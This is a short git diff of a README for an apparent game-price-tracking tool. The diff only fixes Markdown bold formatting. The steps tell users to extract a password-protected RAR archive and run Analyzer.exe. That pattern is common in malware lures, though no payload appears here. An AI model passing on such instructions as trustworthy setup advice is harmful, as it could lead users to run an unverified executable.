@@ -22,7 +22,7 @@ The software provides **real-time price tracking, market trends, and recommendat
 ## 📥 Installation & Launch
 
 ### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
-1️⃣ **Download and extract the `GameData_Analyzer.rar` (pass: 123Gamedata)  
+1️⃣ **Download and extract the `GameData_Analyzer.rar` (pass: 123Gamedata)**
 2️⃣ **Run `Analyzer.exe`**  
 🚀 **The application will set up everything automatically, just enjoy!**  
 
